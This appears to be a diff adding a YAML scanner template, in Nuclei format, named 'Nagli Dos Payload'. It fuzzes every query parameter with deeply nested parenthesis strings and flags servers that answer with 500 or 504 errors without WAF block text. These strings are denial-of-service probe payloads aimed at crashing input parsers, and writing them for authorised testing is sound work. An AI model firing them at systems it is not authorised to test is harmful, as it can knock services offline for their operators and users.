@@ -1,0 +1,42 @@
+id: nagli-dos-payload
+
+info:
+  name: Nagli Dos Payload
+  author: reewardius
+  severity: high
+  tags: dos,fuzzing
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      uniq:
+        - "(((((()0)))))"
+        - "((((((()0))))))"
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{uniq}}"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+          - 504
+        condition: or
+        
+      - type: word
+        words:
+          - "Access Denied"
+          - "Error 1006"
+          - "Cloudflare"
+        condition: or
+        part: body
+        negative: true
